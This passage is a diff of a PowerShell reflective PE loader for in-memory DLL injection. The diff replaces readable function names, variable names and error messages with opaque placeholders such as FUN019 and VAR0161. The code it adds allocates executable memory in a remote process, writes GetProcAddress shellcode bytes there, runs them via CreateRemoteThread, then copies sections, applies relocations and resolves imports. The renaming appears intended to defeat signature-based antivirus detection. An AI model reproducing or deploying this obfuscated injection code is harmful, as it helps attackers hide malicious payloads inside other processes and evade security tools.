+                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0170, $VAR0172, $false)
+                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+                FUN010 -Bytes $VAR0177 -VAR0129 $VAR0172
+                $VAR0172 = FUN005 $VAR0172 ($VAR0177.Length)
+
+                $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+                if ($VAR0178 -eq [IntPtr]::Zero) {
+                    Throw "ERROR13"
+                }
+
+                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
+                if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
+                    Throw "ERROR14"
+                }
+
+                $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
+                if ($VAR0144 -ne 0) {
+                    Throw "ERROR15"
+                }
+
+                
+                [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
+                $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0170, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
+                if ($VAR0144 -eq $false) {
+                    Throw "ERROR16"
+                }
+                [IntPtr]$VAR0181 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])
+
+                $VAR0042.FUN039.Invoke($VAR0161, $VAR0170, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
+                $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
             }
             else {
-                [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
-                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
-                if ($Result -ne 0) {
-                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+                [IntPtr]$VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0169 -ArgumentPtr $VAR0166 -VAR0042 $VAR0042
+                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
+                if ($VAR0144 -ne 0) {
+                    Throw "ERROR17."
                 }
 
-                [Int32]$ExitCode = 0
-                $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
-                if (($Result -eq 0) -or ($ExitCode -eq 0)) {
-                    Throw "Call to GetExitCodeThread failed"
+                [Int32]$VAR0182 = 0
+                $VAR0144 = $VAR0042.FUN048.Invoke($VAR0179, [Ref]$VAR0182)
+                if (($VAR0144 -eq 0) -or ($VAR0182 -eq 0)) {
+                    Throw "ERROR18"
                 }
 
-                [IntPtr]$DllAddress = [IntPtr]$ExitCode
+                [IntPtr]$VAR0181 = [IntPtr]$VAR0182
             }
 
-            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+            $VAR0042.FUN039.Invoke($VAR0161, $VAR0166, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
 
-            return $DllAddress
+            return $VAR0181
         }
 
-        Function Get-RemoteProcAddress {
+        Function FUN019 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
-                $RemoteProcHandle,
+                $VAR0161,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
-                $RemoteDllHandle,
+                $VAR0183,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [IntPtr]
-                $FunctionNamePtr, 
+                $VAR0184, 
 
                 [Parameter(Position = 3, Mandatory = $true)]
                 [Bool]
-                $LoadByOrdinal
+                $VAR0185
             )
 
-            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 
-            [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   
+            [IntPtr]$VAR0186 = [IntPtr]::Zero   
             
-            if (-not $LoadByOrdinal) {
-                $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)
+            if (-not $VAR0185) {
+                $VAR0187 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0184)
 
                 
-                $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
-                $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
-                if ($RFuncNamePtr -eq [IntPtr]::Zero) {
-                    Throw "Unable to allocate memory in the remote process"
+                $VAR0188 = [UIntPtr][UInt64]([UInt64]$VAR0187.Length + 1)
+                $VAR0186 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0188, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+                if ($VAR0186 -eq [IntPtr]::Zero) {
+                    Throw "ERROR17"
                 }
 
-                [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
-                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
+                [UIntPtr]$VAR0167 = [UIntPtr]::Zero
+                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0186, $VAR0184, $VAR0188, [Ref]$VAR0167)
                 if ($Success -eq $false) {
-                    Throw "Unable to write DLL path to remote process memory"
+                    Throw "ERROR18"
                 }
-                if ($FunctionNameSize -ne $NumBytesWritten) {
-                    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
+                if ($VAR0188 -ne $VAR0167) {
+                    Throw "ERROR19"
                 }
             }
             
             else {
-                $RFuncNamePtr = $FunctionNamePtr
+                $VAR0186 = $VAR0184
             }
 
             
-            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
-            $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") 
+            $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
+            $VAR0058 = $VAR0042.FUN036.Invoke($VAR0168, "GetProcAddress") 
 
             
-            $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
-            if ($GetProcAddressRetMem -eq [IntPtr]::Zero) {
-                Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
+            $VAR0189 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UInt64][UInt64]$VAR0163, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+            if ($VAR0189 -eq [IntPtr]::Zero) {
+                Throw "ERROR20"
             }
 
             
             
-            [Byte[]]$GetProcAddressSC = @()
-            if ($PEInfo.PE64Bit -eq $true) {
-                $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
-                $GetProcAddressSC2 = @(0x48, 0xba)
-                $GetProcAddressSC3 = @(0x48, 0xb8)
-                $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
-                $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+            [Byte[]]$VAR0190 = @()
+            if ($VAR0126.CONST032 -eq $true) {
+                $VAR01901 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
+                $VAR01902 = @(0x48, 0xba)
+                $VAR01903 = @(0x48, 0xb8)
+                $VAR01904 = @(0xff, 0xd0, 0x48, 0xb9)
+                $VAR01905 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
             }
             else {
-                $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
-                $GetProcAddressSC2 = @(0xb9)
-                $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
-                $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
-                $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
+                $VAR01901 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
+                $VAR01902 = @(0xb9)
+                $VAR01903 = @(0x51, 0x50, 0xb8)
+                $VAR01904 = @(0xff, 0xd0, 0xb9)
+                $VAR01905 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
             }
-            $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
-            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
-            $SCPSMemOriginal = $SCPSMem
+            $VAR0171 = $VAR01901.Length + $VAR01902.Length + $VAR01903.Length + $VAR01904.Length + $VAR01905.Length + ($VAR0163 * 4)
+            $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
+            $VAR0173 = $VAR0172
 
-            Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-            Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-            Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-            Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-            Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
-            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
+            FUN010 -Bytes $VAR01901 -VAR0129 $VAR0172
+            $VAR0172 = FUN005 $VAR0172 ($VAR01901.Length)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0183, $VAR0172, $false)
+            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+            FUN010 -Bytes $VAR01902 -VAR0129 $VAR0172
+            $VAR0172 = FUN005 $VAR0172 ($VAR01902.Length)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0186, $VAR0172, $false)
+            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+            FUN010 -Bytes $VAR01903 -VAR0129 $VAR0172
+            $VAR0172 = FUN005 $VAR0172 ($VAR01903.Length)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0058, $VAR0172, $false)
+            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+            FUN010 -Bytes $VAR01904 -VAR0129 $VAR0172
+            $VAR0172 = FUN005 $VAR0172 ($VAR01904.Length)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0189, $VAR0172, $false)
+            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+            FUN010 -Bytes $VAR01905 -VAR0129 $VAR0172
+            $VAR0172 = FUN005 $VAR0172 ($VAR01905.Length)
 
-            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
-            if ($RSCAddr -eq [IntPtr]::Zero) {
-                Throw "Unable to allocate memory in the remote process for shellcode"
+            $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+            if ($VAR0178 -eq [IntPtr]::Zero) {
+                Throw "ERROR21"
             }
-            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
-            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
-            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
-                Throw "Unable to write shellcode to remote process memory."
+            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
+            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
+            if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
+                Throw "ERROR22"
             }
 
-            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
-            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
-            if ($Result -ne 0) {
-                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+            $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+            $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
+            if ($VAR0144 -ne 0) {
+                Throw "ERROR23"
             }
 
             
-            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
-            if (($Result -eq $false) -or ($NumBytesWritten -eq 0)) {
-                Throw "Call to ReadProcessMemory failed"
+            [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
+            $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0189, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
+            if (($VAR0144 -eq $false) -or ($VAR0167 -eq 0)) {
+                Throw "ERROR24"
             }
-            [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
+            [IntPtr]$VAR0191 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])
 
             
-            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
-            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+            $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
+            $VAR0042.FUN039.Invoke($VAR0161, $VAR0189, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
 
-            if (-not $LoadByOrdinal) {
-                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+            if (-not $VAR0185) {
+                $VAR0042.FUN039.Invoke($VAR0161, $VAR0186, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
             }
 
-            return $ProcAddress
+            return $VAR0191
         }
 
 
-        Function Copy-Sections {
+        Function FUN020 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Byte[]]
-                $PEBytes,
+                $VAR001,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $PEInfo,
+                $VAR0126,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Functions,
+                $VAR0042,
 
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
-                $Win32Types
+                $VAR010
             )
 
-            for ( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++) {
-                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
-                $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
+            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
+                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
+                $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
 
                 
-                [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
+                [IntPtr]$VAR0193 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0192.CONST074))
 
                 
                 
                 
                 
-                $SizeOfRawData = $SectionHeader.SizeOfRawData
+                $VAR0194 = $VAR0192.CONST144
 
-                if ($SectionHeader.PointerToRawData -eq 0) {
-                    $SizeOfRawData = 0
+                if ($VAR0192.CONST145 -eq 0) {
+                    $VAR0194 = 0
                 }
 
-                if ($SizeOfRawData -gt $SectionHeader.VirtualSize) {
-                    $SizeOfRawData = $SectionHeader.VirtualSize
+                if ($VAR0194 -gt $VAR0192.CONST143) {
+                    $VAR0194 = $VAR0192.CONST143
                 }
 
-                if ($SizeOfRawData -gt 0) {
-                    Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
-                    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
+                if ($VAR0194 -gt 0) {
+                    FUN009 -VAR0125 "FUN020::MarshalCopy" -VAR0126 $VAR0126 -VAR0127 $VAR0193 -Size $VAR0194 | Out-Null
+                    [System.Runtime.InteropServices.Marshal]::Copy($VAR001, [Int32]$VAR0192.CONST145, $VAR0193, $VAR0194)
                 }
 
                 
-                if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize) {
-                    $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
-                    [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
-                    Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
-                    $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
+                if ($VAR0192.CONST144 -lt $VAR0192.CONST143) {
+                    $VAR0195 = $VAR0192.CONST143 - $VAR0194
+                    [IntPtr]$VAR0127 = [IntPtr](FUN005 ([Int64]$VAR0193) ([Int64]$VAR0194))
+                    FUN009 -VAR0125 "FUN020::FUN034" -VAR0126 $VAR0126 -VAR0127 $VAR0127 -Size $VAR0195 | Out-Null
+                    $VAR0042.FUN034.Invoke($VAR0127, 0, [IntPtr]$VAR0195) | Out-Null
                 }
             }
         }
 
 
-        Function Update-MemoryAddresses {
+        Function FUN021 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
-                $PEInfo,
+                $VAR0126,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
-                $OriginalImageBase,
+                $VAR0196,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Constants,
+                $VAR0041,
 
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
-                $Win32Types
+                $VAR010
             )
 
-            [Int64]$BaseDifference = 0
-            $AddDifference = $true 
-            [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
+            [Int64]$VAR0197 = 0
+            $VAR0198 = $true 
+            [UInt32]$VAR0199 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST150)
 
             
-            if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
-                    -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0)) {
+            if (($VAR0196 -eq [Int64]$VAR0126.CONST039) `
+                    -or ($VAR0126.CONST031.CONST122.CONST112.Size -eq 0)) {
                 return
             }
 
 
-            elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true) {
-                $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
-                $AddDifference = $false
+            elseif ((FUN006 ($VAR0196) ($VAR0126.CONST039)) -eq $true) {
+                $VAR0197 = FUN004 ($VAR0196) ($VAR0126.CONST039)
+                $VAR0198 = $false
             }
-            elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true) {
-                $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
+            elseif ((FUN006 ($VAR0126.CONST039) ($VAR0196)) -eq $true) {
+                $VAR0197 = FUN004 ($VAR0126.CONST039) ($VAR0196)
             }
 
             
-            [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
+            [IntPtr]$VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST112.CONST074))
             while ($true) {
                 
-                $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
+                $VAR0201 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0200, [Type]$VAR010.CONST150)
 
-                if ($BaseRelocationTable.SizeOfBlock -eq 0) {
+                if ($VAR0201.CONST151 -eq 0) {
                     break
                 }
 
-                [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
-                $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2
+                [IntPtr]$VAR0202 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0201.CONST074))
+                $VAR0203 = ($VAR0201.CONST151 - $VAR0199) / 2
 
                 
-                for ($i = 0; $i -lt $NumRelocations; $i++) {
+                for ($i = 0; $i -lt $VAR0203; $i++) {
                     
-                    $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
-                    [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])
+                    $VAR0204 = [IntPtr](FUN005 ([IntPtr]$VAR0200) ([Int64]$VAR0199 + (2 * $i)))
+                    [UInt16]$VAR0205 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0204, [Type][UInt16])
 
                     
-                    [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
-                    [UInt16]$RelocType = $RelocationInfo -band 0xF000
+                    [UInt16]$VAR0206 = $VAR0205 -band 0x0FFF
+                    [UInt16]$VAR0207 = $VAR0205 -band 0xF000
                     for ($j = 0; $j -lt 12; $j++) {
-                        $RelocType = [Math]::Floor($RelocType / 2)
+                        $VAR0207 = [Math]::Floor($VAR0207 / 2)
                     }
 
                     
                     
                     
-                    if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
-                            -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64)) {
+                    if (($VAR0207 -eq $VAR0041.CONST013) `
+                            -or ($VAR0207 -eq $VAR0041.CONST014)) {
                         
-                        [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
-                        [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
+                        [IntPtr]$VAR0208 = [IntPtr](FUN005 ([Int64]$VAR0202) ([Int64]$VAR0206))
+                        [IntPtr]$VAR0209 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0208, [Type][IntPtr])
 
-                        if ($AddDifference -eq $true) {
-                            [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
+                        if ($VAR0198 -eq $true) {
+                            [IntPtr]$VAR0209 = [IntPtr](FUN005 ([Int64]$VAR0209) ($VAR0197))
                         }
                         else {
-                            [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
+                            [IntPtr]$VAR0209 = [IntPtr](FUN004 ([Int64]$VAR0209) ($VAR0197))
                         }
 
-                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
+                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0209, $VAR0208, $false) | Out-Null
                     }
-                    elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE) {
+                    elseif ($VAR0207 -ne $VAR0041.CONST012) {
                         
-                        Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
+                        Throw "ERROR25: $VAR0207, ERROR26: $VAR0205"
                     }
                 }
 
-                $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
+                $VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0200) ([Int64]$VAR0201.CONST151))
             }
         }
 
 
-        Function Import-DllImports {
+        Function FUN022 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
-                $PEInfo,
+                $VAR0126,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Functions,
+                $VAR0042,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Types,
+                $VAR010,
 
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
-                $Win32Constants,
+                $VAR0041,
 
                 [Parameter(Position = 4, Mandatory = $false)]
                 [IntPtr]
-                $RemoteProcHandle
+                $VAR0161
             )
 
-            $RemoteLoading = $false
-            if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle) {
-                $RemoteLoading = $true
+            $VAR0210 = $false
+            if ($VAR0126.VAR0263 -ne $VAR0126.CONST039) {
+                $VAR0210 = $true
             }
 
-            if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0) {
-                [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
+                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
 
                 while ($true) {
-                    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
+                    $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
 
                     
-                    if ($ImportDescriptor.Characteristics -eq 0 `
-                            -and $ImportDescriptor.FirstThunk -eq 0 `
-                            -and $ImportDescriptor.ForwarderChain -eq 0 `
-                            -and $ImportDescriptor.Name -eq 0 `
-                            -and $ImportDescriptor.TimeDateStamp -eq 0) {
-                        Write-Verbose "Done importing DLL imports"
